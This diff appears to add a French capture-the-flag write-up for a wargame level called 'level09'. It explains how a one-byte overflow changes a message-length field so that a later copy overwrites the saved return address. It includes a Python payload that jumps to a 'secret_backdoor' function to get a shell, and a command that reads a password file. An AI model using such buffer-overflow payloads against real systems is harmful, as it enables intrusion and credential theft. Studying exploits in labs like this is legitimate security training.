@@ -1,0 +1,19 @@
+# On voit qu'un seul overflow, 1 octet sur le copy du username
+# vu que apres le username de la structure il y a la taille du message, on va pouvoir la modifier  pour 
+# que quand on va lire le message on puisse faire un strncpy plus grand que les 140 caracteres de base
+# Ainsi on va pouvoir reecrire la stack
+
+# On commence par chercher l'offset entre la structure dans le handle_msg et l'eip de la stack
+# l'adresse de la stack ou est eip est 0x7fffffffe5c8
+# Ensuite l'adresse de la structure est 0x7fffffffe500
+
+# On fait la difference et on obtient 200, il va falloir ecrire 200 caracteres + l'adresse ou on veut jump, la fonction secret_backdoor en l'occurence.
+
+# On peut donc modifier que le premier byte du "msglen", mais c'est suffisant, car on peut ecrire jusqu'a 255.
+
+# On recupere l'adresse de "secret_backdoor" qui est 0x55555555488c
+
+python -c "print('0' * 40 + '\xd0\n' + '1' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00\n' + '/bin/sh')" > /tmp/file
+
+cat /tmp/file - | ./level09
+> cat /home/users/end/.pass
